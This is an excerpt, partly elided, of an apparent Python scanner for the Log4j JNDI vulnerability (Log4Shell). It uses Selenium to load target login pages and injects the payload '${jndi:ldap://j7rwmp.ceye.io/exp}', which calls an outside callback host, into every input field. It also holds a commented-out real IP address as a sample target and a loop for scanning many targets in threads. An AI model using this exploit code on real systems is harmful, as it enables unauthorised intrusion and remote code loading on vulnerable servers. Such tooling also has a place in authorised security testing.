...
def exploit(url):
    ...
    payload = """${jndi:ldap://j7rwmp.ceye.io/exp}"""
    chrome_driver = r"/Users/haochen/tool/loophole/chromedriver"
    options = webdriver.ChromeOptions()
    options.add_argument('ignore-certificate-errors')
    driver = webdriver.Chrome(executable_path=chrome_driver,chrome_options=options)
    #url='https://96.90.163.81:7443/login'
    driver.get(url)
    time.sleep(3)
    try:
        tmp1 = driver.find_elements_by_xpath("//input")
        tmp2 = driver.find_elements_by_xpath("//button")
    except:
        pass
    for i in tmp1:
        try:
    ...
    for i in tmp2:
        try:
            ...
            pass
    time.sleep(5)
    #driver.save_screenshot('/Users/haochen/Desktop/picture1.png')
    driver.quit()
    ...
    if url == '' and len(msg) != 0:
        while True:
            ...
            if i >= len(msg) and threading.active_count() == 1:
                ...
                output('正在检测最后',threading.active_count()-1,'个目标，请稍等...')
                time.sleep(5)
